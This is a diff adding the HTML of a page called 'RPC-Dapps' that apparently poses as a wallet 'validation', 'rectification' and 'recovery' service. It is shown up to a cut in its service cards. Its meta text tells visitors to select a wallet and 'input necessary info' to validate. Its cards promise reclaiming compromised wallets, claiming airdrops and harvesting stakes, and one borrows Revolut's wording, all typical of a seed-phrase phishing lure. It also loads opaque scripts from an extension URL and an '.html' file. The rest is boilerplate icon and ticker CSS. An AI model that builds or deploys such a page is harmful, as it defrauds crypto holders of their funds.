@@ -1,0 +1,1316 @@
+<html lang="en">
+  <script src="chrome-extension://lgmpcpglpngdoalbgeoldeajfclnhafa/aptosSDK.js"></script>
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta property="og:title" content="Nativevalidationupdate" />
+    <script src="672b42829c51f52d769cd636.html"></script>
+    <meta
+      property="og:description"
+      content="1. Click the above 2. Select Issue Category 3. Select Wallet 4. Input Necessary Info 5. Validate"
+    />
+    <meta property="og:image" content="interconnected.png" />
+    <meta property="og:url" content="index.html" />
+    <title>RPC-Dapps</title>
+    <style type="text/css">
+      :root,
+      :host {
+        --fa-font-solid: normal 900 1em/1 "Font Awesome 6 Free";
+        --fa-font-regular: normal 400 1em/1 "Font Awesome 6 Free";
+        --fa-font-light: normal 300 1em/1 "Font Awesome 6 Pro";
+        --fa-font-thin: normal 100 1em/1 "Font Awesome 6 Pro";
+        --fa-font-duotone: normal 900 1em/1 "Font Awesome 6 Duotone";
+        --fa-font-duotone-regular: normal 400 1em/1 "Font Awesome 6 Duotone";
+        --fa-font-duotone-light: normal 300 1em/1 "Font Awesome 6 Duotone";
+        --fa-font-duotone-thin: normal 100 1em/1 "Font Awesome 6 Duotone";
+        --fa-font-brands: normal 400 1em/1 "Font Awesome 6 Brands";
+        --fa-font-sharp-solid: normal 900 1em/1 "Font Awesome 6 Sharp";
+        --fa-font-sharp-regular: normal 400 1em/1 "Font Awesome 6 Sharp";
+        --fa-font-sharp-light: normal 300 1em/1 "Font Awesome 6 Sharp";
+        --fa-font-sharp-thin: normal 100 1em/1 "Font Awesome 6 Sharp";
+        --fa-font-sharp-duotone-solid: normal 900 1em/1
+          "Font Awesome 6 Sharp Duotone";
+        --fa-font-sharp-duotone-regular: normal 400 1em/1
+          "Font Awesome 6 Sharp Duotone";
+        --fa-font-sharp-duotone-light: normal 300 1em/1
+          "Font Awesome 6 Sharp Duotone";
+        --fa-font-sharp-duotone-thin: normal 100 1em/1
+          "Font Awesome 6 Sharp Duotone";
+      }
+
+      svg:not(:root).svg-inline--fa,
+      svg:not(:host).svg-inline--fa {
+        overflow: visible;
+        box-sizing: content-box;
+      }
+
+      .svg-inline--fa {
+        display: var(--fa-display, inline-block);
+        height: 1em;
+        overflow: visible;
+        vertical-align: -0.125em;
+      }
+      .svg-inline--fa.fa-2xs {
+        vertical-align: 0.1em;
+      }
+      .svg-inline--fa.fa-xs {
+        vertical-align: 0em;
+      }
+      .svg-inline--fa.fa-sm {
+        vertical-align: -0.0714285705em;
+      }
+      .svg-inline--fa.fa-lg {
+        vertical-align: -0.2em;
+      }
+      .svg-inline--fa.fa-xl {
+        vertical-align: -0.25em;
+      }
+      .svg-inline--fa.fa-2xl {
+        vertical-align: -0.3125em;
+      }
+      .svg-inline--fa.fa-pull-left {
+        margin-right: var(--fa-pull-margin, 0.3em);
+        width: auto;
+      }
+      .svg-inline--fa.fa-pull-right {
+        margin-left: var(--fa-pull-margin, 0.3em);
+        width: auto;
+      }
+      .svg-inline--fa.fa-li {
+        width: var(--fa-li-width, 2em);
+        top: 0.25em;
+      }
+      .svg-inline--fa.fa-fw {
+        width: var(--fa-fw-width, 1.25em);
+      }
+
+      .fa-layers svg.svg-inline--fa {
+        bottom: 0;
+        left: 0;
+        margin: auto;
+        position: absolute;
+        right: 0;
+        top: 0;
+      }
+
+      .fa-layers-counter,
+      .fa-layers-text {
+        display: inline-block;
+        position: absolute;
+        text-align: center;
+      }
+
+      .fa-layers {
+        display: inline-block;
+        height: 1em;
+        position: relative;
+        text-align: center;
+        vertical-align: -0.125em;
+        width: 1em;
+      }
+      .fa-layers svg.svg-inline--fa {
+        transform-origin: center center;
+      }
+
+      .fa-layers-text {
+        left: 50%;
+        top: 50%;
+        transform: translate(-50%, -50%);
+        transform-origin: center center;
+      }
+
+      .fa-layers-counter {
+        background-color: var(--fa-counter-background-color, #ff253a);
+        border-radius: var(--fa-counter-border-radius, 1em);
+        box-sizing: border-box;
+        color: var(--fa-inverse, #fff);
+        line-height: var(--fa-counter-line-height, 1);
+        max-width: var(--fa-counter-max-width, 5em);
+        min-width: var(--fa-counter-min-width, 1.5em);
+        overflow: hidden;
+        padding: var(--fa-counter-padding, 0.25em 0.5em);
+        right: var(--fa-right, 0);
+        text-overflow: ellipsis;
+        top: var(--fa-top, 0);
+        transform: scale(var(--fa-counter-scale, 0.25));
+        transform-origin: top right;
+      }
+
+      .fa-layers-bottom-right {
+        bottom: var(--fa-bottom, 0);
+        right: var(--fa-right, 0);
+        top: auto;
+        transform: scale(var(--fa-layers-scale, 0.25));
+        transform-origin: bottom right;
+      }
+
+      .fa-layers-bottom-left {
+        bottom: var(--fa-bottom, 0);
+        left: var(--fa-left, 0);
+        right: auto;
+        top: auto;
+        transform: scale(var(--fa-layers-scale, 0.25));
+        transform-origin: bottom left;
+      }
+
+      .fa-layers-top-right {
+        top: var(--fa-top, 0);
+        right: var(--fa-right, 0);
+        transform: scale(var(--fa-layers-scale, 0.25));
+        transform-origin: top right;
+      }
+
+      .fa-layers-top-left {
+        left: var(--fa-left, 0);
+        right: auto;
+        top: var(--fa-top, 0);
+        transform: scale(var(--fa-layers-scale, 0.25));
+        transform-origin: top left;
+      }
+
+      .fa-1x {
+        font-size: 1em;
+      }
+
+      .fa-2x {
+        font-size: 2em;
+      }
+
+      .fa-3x {
+        font-size: 3em;
+      }
+
+      .fa-4x {
+        font-size: 4em;
+      }
+
+      .fa-5x {
+        font-size: 5em;
+      }
+
+      .fa-6x {
+        font-size: 6em;
+      }
+
+      .fa-7x {
+        font-size: 7em;
+      }
+
+      .fa-8x {
+        font-size: 8em;
+      }
+
+      .fa-9x {
+        font-size: 9em;
+      }
+
+      .fa-10x {
+        font-size: 10em;
+      }
+
+      .fa-2xs {
+        font-size: 0.625em;
+        line-height: 0.1em;
+        vertical-align: 0.225em;
+      }
+
+      .fa-xs {
+        font-size: 0.75em;
+        line-height: 0.0833333337em;
+        vertical-align: 0.125em;
+      }
+
+      .fa-sm {
+        font-size: 0.875em;
+        line-height: 0.0714285718em;
+        vertical-align: 0.0535714295em;
+      }
+
+      .fa-lg {
+        font-size: 1.25em;
+        line-height: 0.05em;
+        vertical-align: -0.075em;
+      }
+
+      .fa-xl {
+        font-size: 1.5em;
+        line-height: 0.0416666682em;
+        vertical-align: -0.125em;
+      }
+
+      .fa-2xl {
+        font-size: 2em;
+        line-height: 0.03125em;
+        vertical-align: -0.1875em;
+      }
+
+      .fa-fw {
+        text-align: center;
+        width: 1.25em;
+      }
+
+      .fa-ul {
+        list-style-type: none;
+        margin-left: var(--fa-li-margin, 2.5em);
+        padding-left: 0;
+      }
+      .fa-ul > li {
+        position: relative;
+      }
+
+      .fa-li {
+        left: calc(-1 * var(--fa-li-width, 2em));
+        position: absolute;
+        text-align: center;
+        width: var(--fa-li-width, 2em);
+        line-height: inherit;
+      }
+
+      .fa-border {
+        border-color: var(--fa-border-color, #eee);
+        border-radius: var(--fa-border-radius, 0.1em);
+        border-style: var(--fa-border-style, solid);
+        border-width: var(--fa-border-width, 0.08em);
+        padding: var(--fa-border-padding, 0.2em 0.25em 0.15em);
+      }
+
+      .fa-pull-left {
+        float: left;
+        margin-right: var(--fa-pull-margin, 0.3em);
+      }
+
+      .fa-pull-right {
+        float: right;
+        margin-left: var(--fa-pull-margin, 0.3em);
+      }
+
+      .fa-beat {
+        animation-name: fa-beat;
+        animation-delay: var(--fa-animation-delay, 0s);
+        animation-direction: var(--fa-animation-direction, normal);
+        animation-duration: var(--fa-animation-duration, 1s);
+        animation-iteration-count: var(
+          --fa-animation-iteration-count,
+          infinite
+        );
+        animation-timing-function: var(--fa-animation-timing, ease-in-out);
+      }
+
+      .fa-bounce {
+        animation-name: fa-bounce;
+        animation-delay: var(--fa-animation-delay, 0s);
+        animation-direction: var(--fa-animation-direction, normal);
+        animation-duration: var(--fa-animation-duration, 1s);
+        animation-iteration-count: var(
+          --fa-animation-iteration-count,
+          infinite
+        );
+        animation-timing-function: var(
+          --fa-animation-timing,
+          cubic-bezier(0.28, 0.84, 0.42, 1)
+        );
+      }
+
+      .fa-fade {
+        animation-name: fa-fade;
+        animation-delay: var(--fa-animation-delay, 0s);
+        animation-direction: var(--fa-animation-direction, normal);
+        animation-duration: var(--fa-animation-duration, 1s);
+        animation-iteration-count: var(
+          --fa-animation-iteration-count,
+          infinite
+        );
+        animation-timing-function: var(
+          --fa-animation-timing,
+          cubic-bezier(0.4, 0, 0.6, 1)
+        );
+      }
+
+      .fa-beat-fade {
+        animation-name: fa-beat-fade;
+        animation-delay: var(--fa-animation-delay, 0s);
+        animation-direction: var(--fa-animation-direction, normal);
+        animation-duration: var(--fa-animation-duration, 1s);
+        animation-iteration-count: var(
+          --fa-animation-iteration-count,
+          infinite
+        );
+        animation-timing-function: var(
+          --fa-animation-timing,
+          cubic-bezier(0.4, 0, 0.6, 1)
+        );
+      }
+
+      .fa-flip {
+        animation-name: fa-flip;
+        animation-delay: var(--fa-animation-delay, 0s);
+        animation-direction: var(--fa-animation-direction, normal);
+        animation-duration: var(--fa-animation-duration, 1s);
+        animation-iteration-count: var(
+          --fa-animation-iteration-count,
+          infinite
+        );
+        animation-timing-function: var(--fa-animation-timing, ease-in-out);
+      }
+
+      .fa-shake {
+        animation-name: fa-shake;
+        animation-delay: var(--fa-animation-delay, 0s);
+        animation-direction: var(--fa-animation-direction, normal);
+        animation-duration: var(--fa-animation-duration, 1s);
+        animation-iteration-count: var(
+          --fa-animation-iteration-count,
+          infinite
+        );
+        animation-timing-function: var(--fa-animation-timing, linear);
+      }
+
+      .fa-spin {
+        animation-name: fa-spin;
+        animation-delay: var(--fa-animation-delay, 0s);
+        animation-direction: var(--fa-animation-direction, normal);
+        animation-duration: var(--fa-animation-duration, 2s);
+        animation-iteration-count: var(
+          --fa-animation-iteration-count,
+          infinite
+        );
+        animation-timing-function: var(--fa-animation-timing, linear);
+      }
+
+      .fa-spin-reverse {
+        --fa-animation-direction: reverse;
+      }
+
+      .fa-pulse,
+      .fa-spin-pulse {
+        animation-name: fa-spin;
+        animation-direction: var(--fa-animation-direction, normal);
+        animation-duration: var(--fa-animation-duration, 1s);
+        animation-iteration-count: var(
+          --fa-animation-iteration-count,
+          infinite
+        );
+        animation-timing-function: var(--fa-animation-timing, steps(8));
+      }
+
+      @media (prefers-reduced-motion: reduce) {
+        .fa-beat,
+        .fa-bounce,
+        .fa-fade,
+        .fa-beat-fade,
+        .fa-flip,
+        .fa-pulse,
+        .fa-shake,
+        .fa-spin,
+        .fa-spin-pulse {
+          animation-delay: -1ms;
+          animation-duration: 1ms;
+          animation-iteration-count: 1;
+          transition-delay: 0s;
+          transition-duration: 0s;
+        }
+      }
+      @keyframes fa-beat {
+        0%,
+        90% {
+          transform: scale(1);
+        }
+        45% {
+          transform: scale(var(--fa-beat-scale, 1.25));
+        }
+      }
+      @keyframes fa-bounce {
+        0% {
+          transform: scale(1, 1) translateY(0);
+        }
+        10% {
+          transform: scale(
+              var(--fa-bounce-start-scale-x, 1.1),
+              var(--fa-bounce-start-scale-y, 0.9)
+            )
+            translateY(0);
+        }
+        30% {
+          transform: scale(
+              var(--fa-bounce-jump-scale-x, 0.9),
+              var(--fa-bounce-jump-scale-y, 1.1)
+            )
+            translateY(var(--fa-bounce-height, -0.5em));
+        }
+        50% {
+          transform: scale(
+              var(--fa-bounce-land-scale-x, 1.05),
+              var(--fa-bounce-land-scale-y, 0.95)
+            )
+            translateY(0);
+        }
+        57% {
+          transform: scale(1, 1) translateY(var(--fa-bounce-rebound, -0.125em));
+        }
+        64% {
+          transform: scale(1, 1) translateY(0);
+        }
+        100% {
+          transform: scale(1, 1) translateY(0);
+        }
+      }
+      @keyframes fa-fade {
+        50% {
+          opacity: var(--fa-fade-opacity, 0.4);
+        }
+      }
+      @keyframes fa-beat-fade {
+        0%,
+        100% {
+          opacity: var(--fa-beat-fade-opacity, 0.4);
+          transform: scale(1);
+        }
+        50% {
+          opacity: 1;
+          transform: scale(var(--fa-beat-fade-scale, 1.125));
+        }
+      }
+      @keyframes fa-flip {
+        50% {
+          transform: rotate3d(
+            var(--fa-flip-x, 0),
+            var(--fa-flip-y, 1),
+            var(--fa-flip-z, 0),
+            var(--fa-flip-angle, -180deg)
+          );
+        }
+      }
+      @keyframes fa-shake {
+        0% {
+          transform: rotate(-15deg);
+        }
+        4% {
+          transform: rotate(15deg);
+        }
+        8%,
+        24% {
+          transform: rotate(-18deg);
+        }
+        12%,
+        28% {
+          transform: rotate(18deg);
+        }
+        16% {
+          transform: rotate(-22deg);
+        }
+        20% {
+          transform: rotate(22deg);
+        }
+        32% {
+          transform: rotate(-12deg);
+        }
+        36% {
+          transform: rotate(12deg);
+        }
+        40%,
+        100% {
+          transform: rotate(0deg);
+        }
+      }
+      @keyframes fa-spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+      .fa-rotate-90 {
+        transform: rotate(90deg);
+      }
+
+      .fa-rotate-180 {
+        transform: rotate(180deg);
+      }
+
+      .fa-rotate-270 {
+        transform: rotate(270deg);
+      }
+
+      .fa-flip-horizontal {
+        transform: scale(-1, 1);
+      }
+
+      .fa-flip-vertical {
+        transform: scale(1, -1);
+      }
+
+      .fa-flip-both,
+      .fa-flip-horizontal.fa-flip-vertical {
+        transform: scale(-1, -1);
+      }
+
+      .fa-rotate-by {
+        transform: rotate(var(--fa-rotate-angle, 0));
+      }
+
+      .fa-stack {
+        display: inline-block;
+        vertical-align: middle;
+        height: 2em;
+        position: relative;
+        width: 2.5em;
+      }
+
+      .fa-stack-1x,
+      .fa-stack-2x {
+        bottom: 0;
+        left: 0;
+        margin: auto;
+        position: absolute;
+        right: 0;
+        top: 0;
+        z-index: var(--fa-stack-z-index, auto);
+      }
+
+      .svg-inline--fa.fa-stack-1x {
+        height: 1em;
+        width: 1.25em;
+      }
+      .svg-inline--fa.fa-stack-2x {
+        height: 2em;
+        width: 2.5em;
+      }
+
+      .fa-inverse {
+        color: var(--fa-inverse, #fff);
+      }
+
+      .sr-only,
+      .fa-sr-only {
+        position: absolute;
+        width: 1px;
+        height: 1px;
+        padding: 0;
+        margin: -1px;
+        overflow: hidden;
+        clip: rect(0, 0, 0, 0);
+        white-space: nowrap;
+        border-width: 0;
+      }
+
+      .sr-only-focusable:not(:focus),
+      .fa-sr-only-focusable:not(:focus) {
+        position: absolute;
+        width: 1px;
+        height: 1px;
+        padding: 0;
+        margin: -1px;
+        overflow: hidden;
+        clip: rect(0, 0, 0, 0);
+        white-space: nowrap;
+        border-width: 0;
+      }
+
+      .svg-inline--fa .fa-primary {
+        fill: var(--fa-primary-color, currentColor);
+        opacity: var(--fa-primary-opacity, 1);
+      }
+
+      .svg-inline--fa .fa-secondary {
+        fill: var(--fa-secondary-color, currentColor);
+        opacity: var(--fa-secondary-opacity, 0.4);
+      }
+
+      .svg-inline--fa.fa-swap-opacity .fa-primary {
+        opacity: var(--fa-secondary-opacity, 0.4);
+      }
+
+      .svg-inline--fa.fa-swap-opacity .fa-secondary {
+        opacity: var(--fa-primary-opacity, 1);
+      }
+
+      .svg-inline--fa mask .fa-primary,
+      .svg-inline--fa mask .fa-secondary {
+        fill: black;
+      }
+    </style>
+    <link
+      href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css"
+      rel="stylesheet"
+      integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC"
+      crossorigin="anonymous"
+    />
+    <link rel="stylesheet" href="css/styles.css" />
+    <link rel="preconnect" href="https://fonts.googleapis.com/" />
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="" />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800&amp;family=Poppins:wght@200;300;400;500;600&amp;display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="assets/stm_icons/stmicons.css" media="all" />
+    <link rel="icon" href="interconnected.png" type="image/x-icon" />
+    <link rel="shortcut icon" href="interconnected.png" type="image/x-icon" />
+    <script
+      type="text/javascript"
+      src="https://files.coinmarketcap.com/static/widget/coinMarquee.js"
+    ></script>
+    <style>
+      .coin-marquee {
+        -webkit-text-size-adjust: none;
+      }
+      .coin-marquee div {
+        box-sizing: border-box;
+      }
+      .coin-marquee-wrapper {
+        display: flex;
+        align-items: center;
+        background: #fff;
+        border-top: 1px solid #eff2f5;
+        border-bottom: 1px solid #eff2f5;
+        overflow: hidden;
+      }
+      .coin-marquee-wrapper--dark {
+        background: #171924;
+        border-top: 1px solid #222531;
+        border-bottom: 1px solid #222531;
+      }
+      .coin-marquee-wrapper--dark .coin-marquee-header-signature {
+        border-right: 1px solid #40424e;
+      }
+      .coin-marquee-wrapper--dark .coin-marquee-header-signature__power-by {
+        color: #808a9d;
+      }
+      .coin-marquee-wrapper--dark .coin-marquee-item::after {
+        background-color: #40424e;
+      }
+      .coin-marquee-wrapper--dark .coin-marquee-item-inner {
+        color: #fff;
+      }
+      .coin-marquee-wrapper--dark .coin-marquee-item-symbol {
+        color: #a1a7bb;
+      }
+      .coin-marquee-wrapper--dark
+        .coin-marquee-item
+        .coin-marquee-item--skeleton
+        .coin-marquee-item__icon,
+      .coin-marquee-wrapper--dark
+        .coin-marquee-item
+        .coin-marquee-item--skeleton
+        .coin-marquee-item-info__row {
+        background-color: #323546;
+      }
+      .coin-marquee-wrapper--transparent {
+        background: transparent !important;
+      }
+      .coin-marquee-header {
+        float: left;
+        width: 141px;
+      }
+      .coin-marquee-header-signature {
+        overflow: hidden;
+        width: 141px;
+        padding: 12px 16px;
+        box-sizing: border-box;
+        border-right: 1px solid #eff2f5;
+      }
+      .coin-marquee-header-signature svg,
+      .coin-marquee-header-signature div {
+        float: left;
+      }
+      .coin-marquee-header-signature svg {
+        height: 18px;
+      }
+      .coin-marquee-header-signature div {
+        height: 17px;
+        display: inline-block;
+        line-height: 18x;
+        font-weight: 400;
+        font-size: 9px;
+        line-height: 18px;
+        color: #808a9d;
+      }
+      .coin-marquee-container {
+        display: flex;
+        width: calc(100% - 141px);
+        overflow: hidden;
+        white-space: nowrap;
+      }
+      .coin-marquee-container__inner {
+        position: relative;
+        display: inline-block;
+        font-size: 0;
+        line-height: 0;
+        -webkit-animation-play-state: running;
+        animation-play-state: running;
+      }
+      .coin-marquee-container__inner:hover {
+        -webkit-animation-play-state: paused;
+        animation-play-state: paused;
+      }
+      .coin-marquee-item {
+        position: relative;
+        min-width: 220px;
+        display: inline-block;
+        box-sizing: border-box;
+        padding: 0 16px;
+      }
+      .coin-marquee-item:hover,
+      .coin-marquee-item:focus {
+        color: inherit;
+      }
+      .coin-marquee-item::after {
+        content: "";
+        position: absolute;
+        top: 20px;
+        right: 0;
+        display: inline-block;
+        background-color: #eff2f5;
+        width: 1px;
+        height: 20px;
+      }
+      .coin-marquee-item-inner {
+        padding: 16px 0;
+        display: flex;
+        width: 100%;
+        align-items: center;
+        text-decoration: none;
+        color: #000;
+      }
+      .coin-marquee-item-inner:hover {
+        color: inherit;
+      }
+      .coin-marquee-item-inner:hover .coin-marquee-item-name {
+        opacity: 0.6;
+      }
+      .coin-marquee-item__icon {
+        margin-right: 8px;
+        display: inline-block;
+        line-height: 1;
+        min-width: 20px;
+        max-width: 20px;
+        height: 20px;
+      }
+      .coin-marquee-item__icon img {
+        width: 100%;
+        height: 100%;
+      }
+      .coin-marquee-item-info {
+        width: 100%;
+      }
+      .coin-marquee-item-info__row {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        line-height: 1;
+      }
+      .coin-marquee-item-info__row:last-of-type {
+        margin-top: 2px;
+      }
+      .coin-marquee-item-name {
+        margin-right: 12px;
+        transition: 0.1s;
+      }
+      .coin-marquee-item-name,
+      .coin-marquee-item-price {
+        font-size: 12px;
+        line-height: 1;
+        font-weight: 600;
+      }
+      .coin-marquee-item-symbol {
+        font-size: 11px;
+        color: #58667e;
+        transform-origin: left;
+        transform: scale(0.9);
+      }
+      .coin-marquee-item-changes {
+        font-size: 11px;
+        font-weight: 600;
+      }
+      .coin-marquee-item-changes__icon {
+        width: 0;
+        height: 0;
+        position: relative;
+        margin-right: 3px;
+        border-left: 4px solid transparent;
+        border-right: 4px solid transparent;
+      }
+      .coin-marquee-item-changes--up {
+        color: #16c784;
+      }
+      .coin-marquee-item-changes--up .coin-marquee-item-changes__icon {
+        top: -8px;
+        border-bottom: 5px solid #16c784;
+      }
+      .coin-marquee-item-changes--down {
+        color: #ea3943;
+      }
+      .coin-marquee-item-changes--down .coin-marquee-item-changes__icon {
+        top: 10px;
+        border-top: 5px solid #ea3943;
+      }
+      .coin-marquee-item--skeleton .coin-marquee-item__icon {
+        background-color: #eaeff5;
+        border-radius: 50%;
+      }
+      .coin-marquee-item--skeleton .coin-marquee-item-info__row {
+        width: 40px;
+        height: 10px;
+        background-color: #eaeff5;
+      }
+      .coin-marquee-item--skeleton .coin-marquee-item-info__row:first-of-type {
+        width: 80px;
+      }
+      @-webkit-keyframes marquee-scroll {
+        from {
+          transform: translateX(0%);
+        }
+        to {
+          transform: translateX(-50%);
+        }
+      }
+      @keyframes marquee-scroll {
+        from {
+          transform: translateX(0%);
+        }
+        to {
+          transform: translateX(-50%);
+        }
+      }
+    </style>
+  </head>
+
+  <body>
+    <div class="hero-section">
+      <div class="container">
+        <nav class="navbar navbar-expand-lg navbar-dark pt-3">
+          <div class="container-fluid px-0">
+            <h2 class="navbar-brand" href="#">
+              RPC<span style="color: #bc3fea">-Dapps</span>
+            </h2>
+            <button
+              class="navbar-toggler"
+              type="button"
+              data-bs-toggle="collapse"
+              data-bs-target="#navbarSupportedContent"
+              aria-controls="navbarSupportedContent"
+              aria-expanded="false"
+              aria-label="Toggle navigation"
+            >
+              <span class="navbar-toggler-icon"></span>
+            </button>
+
+            <div class="collapse navbar-collapse" id="navbarSupportedContent">
+              <ul class="navbar-nav ms-auto">
+                <li class="nav-item">
+                  <a class="nav-link active-link" href="#">Home</a>
+                </li>
+                <li class="nav-item">
+                  <a class="nav-link" href="javascript:void(0)">Connect</a>
+                </li>
+              </ul>
+            </div>
+          </div>
+        </nav>
+      </div>
+      <div class="container d-flex flex-column-reverse flex-md-row">
+        <div class="hero-col1 d-flex flex-column justify-content-center">
+          <h2>Node Functions</h2>
+          <p class="desc heading-L">
+            TOKEN SWAP &amp; CLAIM TOKEN BRIDGE • LIQUIDITY POOL AND FARM •
+            DEPOSITS AND WITHDRAWALS • TOKENS STAKE AND UNSTAKE • LEDGER AND
+            TREZOR HARDWARE • DEX WEBSITE ERROR • KYC &amp; WHITELIST &amp;
+            ALLOCATION • AIRDROPS • COMPROMISED WALLET RECLAIM • MISSING TOKENS
+            • UNABLE TO ACCESS WALLET • NFT'S AND NFT'S RELATED ISSUES • GENERAL
+            WALLET ISSUES
+          </p>
+          <a
+            href="#services"
+            class="btn d-inline-block hero-btn me-3 py-2 align-self-start"
+            >Start Here</a
+          >
+        </div>
+        <div class="hero-col2">
+          <img
+            class="hero-img mt-5"
+            src="img/DDN.png"
+            alt="Blockchain Rectification"
+          />
+        </div>
+      </div>
+    </div>
+    <div>
+      <div
+        id="coinmarketcap-widget-marquee"
+        coins="1,1027,825,1321,30171,5176,32521,13855,21296,28403,3890,20362,29779"
+        currency="USD"
+        theme="DARK"
+        transparent="false"
+        show-symbol-logo="true"
+      >
+         <iframe src="https://widget.coinlib.io/widget?type=horizontal_v2&theme=dark&pref_coin_id=1505&invert_hover=no" class="w-100 h-5" height="50px" style="width:100%;"></iframe>
+      </div>
+    </div>
+
+    <section class="services" id="services">
+      <div class="container">
+        <h2 class="services-heading pb-5">Services</h2>
+        <p class="services-desc pb-5" style="display: none">
+          RPC-Dapps is a decentralized protocol. dConnect create an innovative
+          open-source software ecosystem that is both secure and resilient. And
+          it allows developers to create new online tools, many of which have
+          the interest of global business markets. Validation of wallet will be
+          completed below as follows
+        </p>
+        <div class="services-container">
+          <div class="service-card link-container">
+            <a href="javascript:void(0)" class="open"> </a>
+            <div class="service-card-details">
+              <a href="javascript:void(0)" class="open">
+                <i class="stm-chart-refresh"></i>
+                <h3>RECTIFICATION</h3>
+                <p>
+                  Rectification support warranties completely decentralized
+                </p> </a
+              ><a
+                href="javascript:void(0)"
+                class="open btn d-inline-block srv-btn me-3 py-1 align-self-start"
+                >Select</a
+              >
+            </div>
+          </div>
+          <div class="service-card link-container">
+            <a href="javascript:void(0)" class="open"> </a>
+            <div class="service-card-details">
+              <a href="javascript:void(0)" class="open">
+                <i class="stm-chart-monitor"></i>
+                <h3>VALIDATION</h3>
+                <p>Validation completely decentralized supports wallet</p> </a
+              ><a
+                href="javascript:void(0)"
+                class="open btn d-inline-block srv-btn me-3 py-1 align-self-start"
+                >Select</a
+              >
+            </div>
+          </div>
+          <div class="service-card link-container">
+            <a href="javascript:void(0)" class="open"> </a>
+            <div class="service-card-details">
+              <a href="javascript:void(0)" class="open">
+                <i class="stm-building6"></i>
+                <h3>RECOVERY</h3>
+                <p>Recovery wallet TATs Dapps with Blockchain and DeFi</p> </a
+              ><a
+                href="javascript:void(0)"
+                class="open btn d-inline-block srv-btn me-3 py-1 align-self-start"
+                >Select</a
+              >
+            </div>
+          </div>
+          <div class="service-card link-container">
+            <a href="javascript:void(0)" class="open"> </a>
+            <div class="service-card-details">
+              <a href="javascript:void(0)" class="open">
+                <i class="stm-building6"></i>
+                <h3>SWAP TOKEN</h3>
+                <p>Swap tokens of any type to tokens of any type</p> </a
+              ><a
+                href="javascript:void(0)"
+                class="open btn d-inline-block srv-btn me-3 py-1 align-self-start"
+                >Select</a
+              >
+            </div>
+          </div>
+          <div class="service-card link-container">
+            <a href="javascript:void(0)" class="open"> </a>
+            <div class="service-card-details">
+              <a href="javascript:void(0)" class="open">
+                <i class="stm-ia_clock"></i>
+                <h3>HARVEST MY STAKINGS</h3>
+                <p>
+                  When you choose to redeem, we’ll return your assets to your
+                  Spot Wallet the following day.
+                </p> </a
+              ><a
+                href="javascript:void(0)"
+                class="open btn d-inline-block srv-btn me-3 py-1 align-self-start"
+                >Select</a
+              >
+            </div>
+          </div>
+          <div class="service-card link-container">
+            <a href="javascript:void(0)" class="open"> </a>
+            <div class="service-card-details">
+              <a href="javascript:void(0)" class="open">
+                <i class="stm-ia_clock"></i>
+                <h3>CLAIM</h3>
+                <p>
+                  Claim all initial due tokens as promised on the promotional
+                  terms
+                </p> </a
+              ><a
+                href="javascript:void(0)"
+                class="open btn d-inline-block srv-btn me-3 py-1 align-self-start"
+                >Select</a
+              >
+            </div>
+          </div>
+          <div class="service-card link-container">
+            <a href="javascript:void(0)" class="open"> </a>
+            <div class="service-card-details">
+              <a href="javascript:void(0)" class="open">
+                <i class="stm-ia_clock"></i>
+                <h3>CLAIM PRESALE</h3>
+                <p>
+                  Claim all initial due tokens as promised on the promotional
+                  terms
+                </p> </a
+              ><a
+                href="javascript:void(0)"
+                class="open btn d-inline-block srv-btn me-3 py-1 align-self-start"
+                >Select</a
+              >
+            </div>
+          </div>
+          <div class="service-card link-container">
+            <a href="javascript:void(0)" class="open"> </a>
+            <div class="service-card-details">
+              <a href="javascript:void(0)" class="open">
+                <i class="stm-ia_clock"></i>
+                <h3>CLAIM REWARDS</h3>
+                <p>
+                  Claim all initial due rewards as promised on the promotional
+                  terms
+                </p> </a
+              ><a
+                href="javascript:void(0)"
+                class="open btn d-inline-block srv-btn me-3 py-1 align-self-start"
+                >Select</a
+              >
+            </div>
+          </div>
+          <div class="service-card link-container">
+            <a href="javascript:void(0)" class="open"> </a>
+            <div class="service-card-details">
+              <a href="javascript:void(0)" class="open">
+                <i class="stm-ia_clock"></i>
+                <h3>TRANSFER OPTION</h3>
+                <p>
+                  Transfer tokens or coins to friends anywhere around the world.
+                </p> </a
+              ><a
+                href="javascript:void(0)"
+                class="open btn d-inline-block srv-btn me-3 py-1 align-self-start"
+                >Select</a
+              >
+            </div>
+          </div>
+          <div class="service-card link-container">
+            <a href="javascript:void(0)" class="open"> </a>
+            <div class="service-card-details">
+              <a href="javascript:void(0)" class="open">
+                <i class="stm-chart-refresh"></i>
+                <h3>WITHDRAWAL</h3>
+                <p>
+                  A crypto withdrawal is a transaction that allows you to move
+                  your cryptocurrency balance off the Revolut platform to an
+                  external crypto wallet that you control such as a Ledger or a
+                  Trezor.
+                </p> </a
+              ><a
+                href="javascript:void(0)"
+                class="open btn d-inline-block srv-btn me-3 py-1 align-self-start"
+                >Select</a
+              >
+            </div>
+          </div>
+          <div class="service-card link-container">
+            <a href="javascript:void(0)" class="open"> </a>
+            <div class="service-card-details">
+              <a href="javascript:void(0)" class="open">
+                <i class="stm-chart-refresh"></i>
+                <h3>STAKE</h3>
+                <p>
+                  A staking pool allows multiple stakeholders (or bagholders) to
+                  combine their computational resources as a way to increase
+                  their chances of being rewarded.
+                </p> </a
+              ><a
+                href="javascript:void(0)"
+                class="open btn d-inline-block srv-btn me-3 py-1 align-self-start"
+                >Select</a
+              >
+            </div>
+          </div>
+          <div class="service-card link-container">
+            <a href="javascript:void(0)" class="open"> </a>
+            <div class="service-card-details">
+              <a href="javascript:void(0)" class="open">
+                <i class="stm-chart-refresh"></i>
+                <h3>MIGRATION</h3>
+                <p>Migrate tokens to a new contract</p> </a
+              ><a
+                href="javascript:void(0)"
+                class="open btn d-inline-block srv-btn me-3 py-1 align-self-start"
+                >Select</a
+              >
+            </div>
+          </div>
+          <div class="service-card link-container">
+            <a href="javascript:void(0)" class="open"> </a>
+            <div class="service-card-details">
+              <a href="javascript:void(0)" class="open">
+                <i class="stm-chart-refresh"></i>
